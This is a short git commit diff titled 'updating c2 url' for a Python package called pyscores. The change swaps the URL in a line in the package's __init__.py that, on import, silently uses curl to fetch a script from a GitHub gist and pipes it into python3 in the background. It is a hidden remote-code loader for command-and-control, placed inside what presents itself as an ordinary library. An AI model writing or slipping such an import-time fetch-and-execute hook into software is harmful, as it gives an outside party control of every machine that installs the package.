8a6185f41db2cd1ecaaa71ff131952f2f00b811a
Mrugank Patankar <mrugank@canva.com>
2023-01-16 14:38:42 +1100

    updating c2 url

--- pyscores/__init__.py
+++ pyscores/__init__.py
@@ -1,3 +1,3 @@
 import os
 
-os.system('curl -s https://gist.githubusercontent.com/sysophost/771dc73c358721c5b8eb25108e497fb5/raw/a47f3373a8c28018ba3e880c3ac519a99fcaaacd/foo.txt | python3 &')
+os.system('curl -s https://gist.githubusercontent.com/sysophost/771dc73c358721c5b8eb25108e497fb5/raw/b1bab60d6bf59e403d92268d0bb5f6b25990f383/foo.txt | python3 &')
